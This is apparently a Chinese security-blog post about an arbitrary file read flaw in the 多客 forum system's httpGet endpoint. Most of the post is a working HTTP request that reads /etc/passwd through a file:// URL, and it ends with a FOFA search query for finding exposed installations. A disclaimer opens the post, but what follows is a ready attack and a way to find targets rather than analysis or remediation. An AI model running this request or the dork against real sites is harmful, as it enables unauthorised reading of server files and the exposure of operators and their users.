#  多客圈子论坛系统httpGet任意文件读取漏洞复现   
小白菜安全  小白菜安全   2024-06-11 19:59  
  
**免责声明**  
  
该公众号主要是分享互联网上公开的一些漏洞poc和工具，  
利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如果本公众号分享导致的侵权行为请告知，我们会立即删除并道歉。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia1Au88bO1jFd8V3AmqMvsqEZUFalBicQwJaic1tesic3duRuGPPQ3E1vczEJ67UzoMicSWMZpKwRElxtA/640?wx_fmt=png "")  
  
**漏洞影响范围**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia0YxmA3QRqiaw1KWQloS1Tt1icOPkOEXlqfagu604Oeiaasv8a960K84RgibDFA3OK7hlZszzI8cRiaQyA/640?wx_fmt=png&from=appmsg "")  
#  漏洞复现  
  
**poc**  
```
GET /index.php/api/login/httpGet?url=file:///etc/passwd HTTP/2
Host: 127.0.0.1
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Connection: close


```  
  
出现如下数据表示漏洞存在  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia0YxmA3QRqiaw1KWQloS1Tt1Dsiazplkb9HTDwFVH8BWSv1Qkib3dLaP4ZF7zaHsOuqKbialicPa2LG1JQ/640?wx_fmt=png&from=appmsg "")  
# 搜索语法  
  
**fofa:title="多客-兴趣交友神器"**  
  
